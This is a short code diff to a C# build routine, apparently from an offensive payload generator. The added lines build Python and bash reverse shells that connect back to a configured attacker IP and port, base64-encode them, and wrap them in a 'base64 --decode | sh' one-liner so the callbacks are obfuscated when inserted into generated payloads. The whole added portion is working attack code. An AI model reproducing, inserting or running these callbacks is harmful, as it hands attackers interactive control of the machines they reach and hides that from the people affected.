@@ -658,6 +658,15 @@ namespace Build
 
                 output = output.Replace("{DECODE}", "");
 
+                //Special encoded callbacks
+                string cb = @"printf '%s' 'XXX' | base64 --decode | sh";
+                string cbpy = $"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{CONFIG.ATTACKER_IP}\",{CONFIG.LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
+                string cbsh = $"bash -i >& /dev/tcp/{CONFIG.ATTACKER_IP}/{CONFIG.LPORT} 0>&1";
+
+                output = output.Replace("{ENC_CALLBACK_PYTHON}", cb.Replace("XXX", Convert.ToBase64String(Encoding.UTF8.GetBytes(cbpy))));
+                output = output.Replace("{ENC_CALLBACK_BASH}", cb.Replace("XXX", Convert.ToBase64String(Encoding.UTF8.GetBytes(cbsh))));
+
+
 
             }
 
